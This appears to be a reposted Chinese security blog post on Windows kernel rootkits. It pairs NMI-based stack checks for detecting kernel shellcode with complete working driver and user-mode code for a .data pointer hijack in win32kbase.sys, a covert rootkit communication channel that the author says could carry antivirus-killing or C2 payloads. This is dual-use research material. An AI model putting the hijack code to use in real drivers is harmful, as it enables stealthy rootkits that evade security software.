当然中断有很多种，像IPI、DPC、APC都可以打断线程执行我们的堆栈检查回调；我这里选择了NMI（Non-Maskable Interrupt）即不可屏蔽中断。使用如下代码向CPU所有核心发送NMI：

```c
NTSTATUS
LaunchNonMaskableInterrupt(_In_ PNMI_CONTEXT NmiContext)
{
if (!NmiContext)
return STATUS_INVALID_PARAMETER;
PKAFFINITY_EX ProcAffinityPool =
ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAFFINITY_EX), PROC_AFFINITY_POOL);
if (!ProcAffinityPool)
return STATUS_MEMORY_NOT_ALLOCATED;
// 这里注册了NMI回调，打断后进入NmiCallback
PVOID registration_handle = KeRegisterNmiCallback(NmiCallback, NmiContext);
if (!registration_handle)
{
ExFreePoolWithTag(ProcAffinityPool, PROC_AFFINITY_POOL);
return STATUS_MEMORY_NOT_ALLOCATED;
}
LARGE_INTEGER delay = {0};
delay.QuadPart -= 100 * 10000;
for (ULONG core = 0; core < KeQueryActiveProcessorCount(0); core++)
{
KeInitializeAffinityEx(ProcAffinityPool);
KeAddProcessorAffinityEx(ProcAffinityPool, core);
DEBUG_LOG("Sending NMI");
HalSendNMI(ProcAffinityPool);
// 同一时间只能处理一个NMI，所以这里加个延时
// 确保NMI回调执行完毕
KeDelayExecutionThread(KernelMode, FALSE, &delay);
}
KeDeregisterNmiCallback(registration_handle);
ExFreePoolWithTag(ProcAffinityPool, PROC_AFFINITY_POOL);
return STATUS_SUCCESS;
}
```

注意一个内核编程的细节，在高IRQL下执行代码要尽可能简单、短暂，否则操作系统有什么其他错误没法及时处理就会蓝屏。所以我们需要把堆栈检测分为**采集堆栈+堆栈分析**两个步骤，其中 采集堆栈在 NmiCallback 中完成。

回调函数主要参考师傅的方法，只有他这么做才不会蓝屏，直接在回调函数中调用 RtlWalkFrameChain 采集堆栈是会蓝屏的。

其代码如下：

KPCR 是每个CPU核心私有的一个结构，存储了一些上下文切换时的寄存器信息，加速上下文切换

TSS 在X64下基本不怎么用了，但其中保存了异常处理的栈地址

machineFrame 是压入异常处理栈的一个结构，其中保存了返回地址 RIP 以及 RSP ，这正是我们需要的

```c
NmiCallback(_In_ BOOLEAN Handled)
{
UNREFERENCED_PARAMETER(Handled);
UINT64 kpcr = 0;
TASK_STATE_SEGMENT_64* tss = NULL;
PMACHINE_FRAME machineFrame = NULL;
kpcr = __readmsr(IA32_GS_BASE);// 拿到当前CPU的KPCR
tss = *(TASK_STATE_SEGMENT_64**)(kpcr + KPCR_TSS_BASE_OFFSET);// 0x8
machineFrame = tss->Ist3 - sizeof(MACHINE_FRAME);
{
// 在这里对堆栈检查，比如是否在有效模块内
// 不在的话则认为是内核shellcode
CheckStack(machineFrame->rip,machineFrame->rsp);
}
}
```

拿到 RIP 后，就可以判断其是否在正常的内核模块范围内，若不在，则判定为Rootkit

```c
IsInstructionPointerInInvalidRegion(_In_ UINT64 RIP,
_In_ PSYSTEM_MODULES SystemModules,
_Out_ PBOOLEAN Result)
{
if (!RIP ||!SystemModules ||!Result)
return STATUS_INVALID_PARAMETER;
for (INT i = 0; i < SystemModules->module_count; i++)
{
// 不会检查HAL层和PatchGuard的运行
PRTL_MODULE_EXTENDED_INFO system_module =
(PRTL_MODULE_EXTENDED_INFO)((uintptr_t)SystemModules->address +
i * sizeof(RTL_MODULE_EXTENDED_INFO));
UINT64 base = (UINT64)system_module->ImageBase;
UINT64 end = base + system_module->ImageSize;
if (RIP >= base && RIP <= end)
{
*Result = TRUE;
return STATUS_SUCCESS;
}
}
*Result = FALSE;
return STATUS_SUCCESS;
}
```

利用NMI中断检测Rootkit有一个弊端，那就是Rootkit的运行要相对活跃一点，这样我们才能有效命中其线程；对于一些游戏外挂的rookit来说是比较管用的

### 通信检查

####.data ptr hijack

在我的上一篇文章中讲了利用ETW挂钩系统调用，我们可以复用这一思想，对 NtDeviceIoControl 进行监控；因为BYOVD这样的攻击是利用合法驱动的漏洞来强杀EDR的，而合法驱动通常就采用 IRP 进行通信。

这又引出一个问题：如果Rootkit驱动是攻击者自己的呢？那很显然攻击者不会在使用Windows提供的这种官方通信手段了，而转而使用一些更隐蔽的通信手段，比如.data ptr 劫持。

.data ptr 劫持是在游戏外挂圈被提出的一个概念，它利用Patch Guard对.data 段中的函数指针监控不严格这一特性，替换某些在**3环能够直接调用，调用完毕后发送至内核的特殊函数**，这类函数通常存在于 win32k.sys ， win32kbase.sys 等

Windows的图形子系统原本是纯3环实现的，在后来的更新中被搬进了0环，由于微软工程师考虑不周暴露出了很多的安全漏洞，之前奇安信披露的StepBear技术就是在这个驱动中的。

这里我们介绍一种不依赖于高频线程的.data ptr 劫持，在一定程度上能规避 NMI 中断命中Rootkit线程。

对于 win32kbase.sys 来说，这个特殊的驱动在会话空间中加载，它会被映射到GUI进程（比如 Winlogon ）中，因此我们想要替换.data ptr 需要调用 KeStackAttachProcess 挂靠到 Winlogon 的上下文中，再通过特征码的方法定位要替换的函数指针。本人的测试系统为**Win11 21H2**，不同系统差异可能较大。

我们关注的函数指针位于 ApiSetEditionCreateWindowStationEntryPoint 中，如下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110616-99eedae2-99bc-1.png)

但是 ApiSetEditionCreateWindowStationEntryPoint 是未导出的，定位这个函数有点麻烦，不妨先定位其上层封装函数 NtUserCreateWindowStation ，这个函数是导出的

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110616-9a1329e8-99bc-1.png)

下面是一个在指定模块定位导出函数的工具方法：

```cpp
PVOID
GetSystemRoutineAddress(
const PWCHAR& moduleName,
const PCHAR& functionToResolve
)
{
PVOID moduleBase = EvscGetBaseAddrOfModule(moduleName);
DbgPrint("0x%lx\r\n", (ULONG_PTR)moduleBase);
if (!moduleBase)
return NULL;
// 解析PE头和导出表目录
PFULL_IMAGE_NT_HEADERS ntHeader = (PFULL_IMAGE_NT_HEADERS)((ULONG_PTR)moduleBase + ((PIMAGE_DOS_HEADER)moduleBase)->e_lfanew);
PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)moduleBase + ntHeader->OptionalHeader.DataDirectory[0].VirtualAddress);
PULONG addrOfNames = (PULONG)((ULONG_PTR)moduleBase + exportDir->AddressOfNames);
PULONG addrOfFuncs = (PULONG)((ULONG_PTR)moduleBase + exportDir->AddressOfFunctions);
PUSHORT addrOfOrdinals = (PUSHORT)((ULONG_PTR)moduleBase + exportDir->AddressOfNameOrdinals);
// 遍历导出目录
for (unsigned int i = 0; i < exportDir->NumberOfNames; ++i)
{
CHAR* currentFunctionName = (CHAR*)((ULONG_PTR)moduleBase + (ULONG_PTR)addrOfNames[i]);
if (strcmp(currentFunctionName, functionToResolve) == 0)
{
PULONG addr = (PULONG)((ULONG_PTR)moduleBase + (ULONG_PTR)addrOfFuncs[addrOfOrdinals[i]]);
return (PVOID)addr;
}
}
return NULL;
}
```

定位 NtUserCreateWindowStation

PVOID funcAddr = GetSystemRoutineAddress(L"win32kbase.sys", "NtUserCreateWindowStation");

下面是 ApiSetEditionCreateWindowStationEntryPoint 中函数指针的特征部分，通过 48 8B 05???????? 48 85 C0 定位即可

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110616-9a39d306-99bc-1.png)

定位、替换指针的完整代码如下：

```cpp
NTSTATUS
    DriverEntry(
    _In_ PDRIVER_OBJECT   DriverObject,
    _In_ PUNICODE_STRING  RegistryPath
) {
    UNREFERENCED_PARAMETER(RegistryPath);
    KAPC_STATE apcState = { 0 };
    //
    // 将驱动线程挂靠到GUI程序Winlogon上，这样才能访问win32kbase.sys
    //
    UNICODE_STRING sWinLogon = RTL_CONSTANT_STRING(L"winlogon.exe");
    HANDLE winlogonPid = Memory::EvscGetPidFromProcessName(sWinLogon);
    DbgPrint("[*] winLogonPid: 0x%x\n", HandleToULong(winlogonPid));
    PsLookupProcessByProcessId(winlogonPid, &g_pWinlogon);
    //
    // 共享内存用于写入Payload，返回的地址为g_hSharedMemory
    //
    if (!NT_SUCCESS(CreateSharedMemory()))
    {
        DbgPrint("[!] Could not create shared memory\n");
        return STATUS_FAILED_DRIVER_ENTRY;
    }
    // 挂靠
    KeStackAttachProcess(g_pWinlogon, &apcState);
    {
        //
        // 定位NtUserCreateWindowStation
        //
        PVOID funcAddr = Memory::EvscGetSystemRoutineAddress(L"win32kbase.sys", "NtUserCreateWindowStation");
        if (!funcAddr)
        {
            KeUnstackDetachProcess(&apcState);
            return STATUS_NOT_FOUND;
        }
        DbgPrint("[*] NtUserCreateWindowStation found at 0x%llx\n", (ULONG_PTR)funcAddr);
        //
        // 特征定位.data ptr
        //
        ULONG_PTR dataPtrPattern = (ULONG_PTR)FindPattern(
            (PVOID)(funcAddr),
            200,
            "\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0",
            "xxx????xxx"
        );
        // 48 8B 05 ?? ?? ?? ?? 48 85 C0
        if (dataPtrPattern)
        {
            DbgPrint("    Pattern : 0x%llx\r\n", dataPtrPattern);
            UINT32 offset = *(PUINT32)(dataPtrPattern + 3);
            DbgPrint("    Offset  : 0x%lx\r\n", offset);
            g_dataPtrAddress = dataPtrPattern + offset + 3 + 4;
            DbgPrint("    .data ptr addr : 0x%llx\r\n", g_dataPtrAddress);
        }
        else
        {
            DbgPrint("[!] Pattern not found\r\n");
            KeUnstackDetachProcess(&apcState);
            return STATUS_NOT_FOUND;
        }
        //
        // 交换函数指针，实现Hook
        //
        *(PVOID*)&g_pOriginalFunction = _InterlockedExchangePointer((PVOID*)g_dataPtrAddress, HookedFunction);
        DbgPrint("[*] .data ptr hooked\r\n");
    }
    KeUnstackDetachProcess(&apcState);
    return STATUS_SUCCESS;
}
```

我们的代码只用于简单的通信测试，Hook函数写的简单点：

```cpp
INT HookedFunction(int a1, int a2, int a3, int a4, int a5, __int64 a6, __int64 a7, int a8)
{
    DbgPrint("[*] Hook triggered\r\n");
    if (ExGetPreviousMode() == UserMode && g_pSharedMemory)
    {
        // 读取共享内存中3环写入的payload
        KAPC_STATE apc = { 0 };
        KeStackAttachProcess(g_pWinlogon, &apc);
        PAYLOAD payload = *(PAYLOAD*)g_pSharedMemory;
        DbgPrint("[*] Got command: %i\r\n", payload.cmdType);
        // 标记已被执行过，让3环读取结果
        (*((PAYLOAD*)g_pSharedMemory)).executed = 1;
        (*((PAYLOAD*)g_pSharedMemory)).status = 0;
        KeUnstackDetachProcess(&apc);
    }
    return g_pOriginalFunction(a1, a2, a3, a4, a5, a6, a7, a8);
}
```

3环的实现就很简单了：

- 获取到共享内存的地址
- 调用 CreateWindowsStationA 触发0环hook，实现通信

```cpp
INT
main()
{
    // 打开驱动创建的共享内存区域
    HANDLE hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, L"Global\\Rootkit");
    if (!hMapFile)
    {
        return 1;
    }
    // 将这一区域映射到自己的地址空间中
    PAYLOAD* pSharedBuf = (PAYLOAD*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(PAYLOAD));
    if (!pSharedBuf)
    {
        return 2;
    }
    // 填充payload
    PAYLOAD payload = { 0 };
    payload.cmdType = CMD_LOG_MESSAGE;
    payload.executed = 0;
    RtlCopyMemory(pSharedBuf, &payload, sizeof(PAYLOAD));
    // 触发Hook
    std::cout << "[*] Triggering driver" << std::endl;
    HWINSTA hWinSta = CreateWindowStationA(
        "MyWinStation",
        0,
        WINSTA_ALL_ACCESS,
        NULL
    );
    // 等待一秒，检查payload有没有被修改
    while (!pSharedBuf->executed)
        Sleep(1000);
    std::cout << "[*] Status: " << pSharedBuf->status << std::endl;
}
```

测试效果如下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20250925110617-9a623210-99bc-1.png)

在实际的rootkit中，可将payload替换成强杀杀毒软件或连接C2等功能。

#### 检测

以上的通信手段仅仅替换了一个函数指针，想要检测是相对困难的。据我所知，目前有大量的 .data ptr 被应用于游戏外挂的通信中，反作弊的检测手段是捕捉到这些异常高频的函数调用，追踪到对应的内核函数，比如这里的 NtUserCreateWindowStation ，再检测其中的函数指针有没有被篡改，比如 .data ptr 指向了 win32kbase.sys 外的地址，那很显然是被篡改了。

此后，反作弊会标记这个 .data ptr ，下次则以特征扫描的方法直接对比是否被篡改。理论上，我们可以直接监控 win32kbase.sys 、 win32k.sys 、 ntoskrnl.exe 这些易受攻击的驱动中的所有的函数指针，定时检测是否被篡改。但这几乎是不可行的，因为Windows中的可能被替换的函数指针太多了，就连PatchGuard自己都没法做到全部监控，再加上不同版本函数差异太大，任何杀毒或者反作弊都没有精力监控全部的函数指针。

### 参考文章及项目

[1] 反反 Rootkit 技术 - 第三部分：劫持指针 --- (Anti-)Anti-Rootkit Techniques - Part III: Hijacking Pointers（eversinc33.com）

[2] Kernel-Adventures/DataPtrHijack at main · eversinc33/Kernel-Adventures（github.com）

[3] [原创]简述常规的 " 驱动 .data 通信 " 如何利用/查找-软件逆向-看雪论坛

[4] [原创]使用NMI中断检测无模块驱动-编程技术-看雪论坛（https://bbs.kanxue.com/thread-288576.htm）

> （附录完。以上原文内容转载自先知社区，版权归原作者所有。）
